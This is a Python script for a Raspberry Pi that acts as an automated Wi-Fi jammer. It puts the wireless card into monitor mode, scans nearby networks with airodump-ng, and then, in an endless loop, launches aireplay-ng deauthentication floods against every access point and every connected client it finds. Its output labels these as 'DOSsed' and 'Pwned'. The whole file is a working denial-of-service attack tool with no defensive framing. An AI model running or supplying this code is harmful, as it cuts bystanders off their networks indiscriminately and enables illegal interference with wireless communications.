import os
import csv
import time
import RPi.GPIO as GPIO
import subprocess
r = 26
g = 6
b = 5
max = 3
GPIO.setmode(GPIO.BCM)
GPIO.setwarnings(False)
GPIO.setup(r, GPIO.OUT)
GPIO.setup(g, GPIO.OUT)
GPIO.setup(b, GPIO.OUT)
GPIO.output(r, True)
GPIO.output(g, True)
GPIO.output(b, True)
GPIO.output(r, False)
time.sleep(0.4)
GPIO.output(r, True)
GPIO.output(g, False)
time.sleep(0.4)
GPIO.output(g, True)
GPIO.output(b, False)
time.sleep(0.4)
GPIO.output(b, True)
os.system("sudo airmon-ng check kill")
os.system("sudo airmon-ng start wlan0")
os.system("sudo ifconfig wlan0 down")
def scan(channel, duration, write):
	execute = []
	execute.append("airodump-ng")
	if write == True:
		execute.append("-w")
		execute.append("clients")
		os.system('rm clients-01.csv;rm clients-01.cap;rm clients-01.kismet.netxml;rm clients-01.kismet.csv')
	if int(channel) > 0:
		execute.append("-c")
		execute.append(channel)
	execute.append("mon0")
	try:
		proc = subprocess.Popen(execute, shell=False)
	except:
		e = sys.exc_info()[0]
		file = open("/mnt/usb/linux/jammer/err.txt","w") 
		file.write(e) 
		file.close()
		sys.exit(0) 
	for t in range(0, duration):
		GPIO.output(b, False)
		time.sleep(0.1)
		GPIO.output(b, True)
		time.sleep(0.9)
	subprocess.call(["kill", "-9", "%d" % proc.pid])
	proc.wait()
def analyse(clientmacs, apmacs, chann, bssids):
	GPIO.output(g, False)
	here = False
	with open('clients-01.csv') as csvfile:
		for row in csv.reader(csvfile):
			try:
				thing = row[0].strip('{} "')
				thinga = row[5].strip('{} "')
				if here == False and thing != "BSSID" and thing != "Station MAC" and thing != "(not associated)":
					bssids.append(thing)
					chann.append(row[3].strip('{} "'))
				if here == True and thinga != "(not associated)":
					clientmacs.append(thing)
					apmacs.append(thinga)
				if thing == "Station MAC":
					here = True
			except:
				pass
	GPIO.output(g, True)	
while 2 == 2:
	scan(0, 20, True)
	clientmacs = []
	apmacs = []
	chann = []
	bssids = []
	analyse(clientmacs, apmacs, chann, bssids)
	mostap = ""
	comn = 0
	mostch = "0"
	for ap in bssids:
		count = 0
		for apmac in apmacs:
			if apmac == ap:
				count = count + 1
		if count > comn:
			comn = count
			mostap = ap
	for x in range(0, len(bssids)):
		if bssids[x] == mostap:
			mostch = chann[x]	
	scan(mostch, 50, True)
	del clientmacs[:]
	del apmacs[:]
	del bssids[:]
	del chann[:]
	analyse(clientmacs, apmacs, chann, bssids)
	time.sleep(5)
	print "Found " + str(len(clientmacs)) + " Clients"
	for vicap in bssids:
		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + vicap + ' --ignore-negative-one mon0')
		print "DOSsed " + vicap
		GPIO.output(r, False)
		time.sleep(0.25)
		GPIO.output(r, True)
		time.sleep(0.25)
	for x in range(0, len(clientmacs)):
		os.system('screen -d -m aireplay-ng --deauth 100 -a ' + apmacs[x] + ' -c ' + clientmacs[x] + ' --ignore-negative-one mon0')
		print "Pwned " + clientmacs[x]
		GPIO.output(r, False)
		time.sleep(0.5)
		GPIO.output(r, True)
		time.sleep(0.5)
	time.sleep(120)
